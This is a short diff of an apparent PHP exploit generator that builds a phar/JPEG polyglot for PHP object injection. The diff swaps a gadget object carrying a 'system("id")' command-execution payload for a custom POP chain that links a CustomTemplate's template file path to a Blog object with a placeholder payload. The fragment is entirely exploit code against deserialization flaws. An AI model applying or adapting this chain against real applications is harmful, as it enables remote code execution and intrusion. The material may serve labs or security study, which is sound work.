@@ -34,12 +34,14 @@ function generate_polyglot($phar, $jpeg){
 }
 
 
-// pop exploit class
-class PHPObjectInjection {}
-$object = new PHPObjectInjection;
-$object->inject = 'system("id");';
-$object->out = 'Hallo World';
+// pop exploit class  -> change class inject here:
+class CustomTemplate{};
+class Blog{};
+$blog = new Blog;
+$blog->desc = 'payload';
 
+$obj = new CustomTemplate;
+$obj->template_file_path = $blog
 
 
 // config for jpg
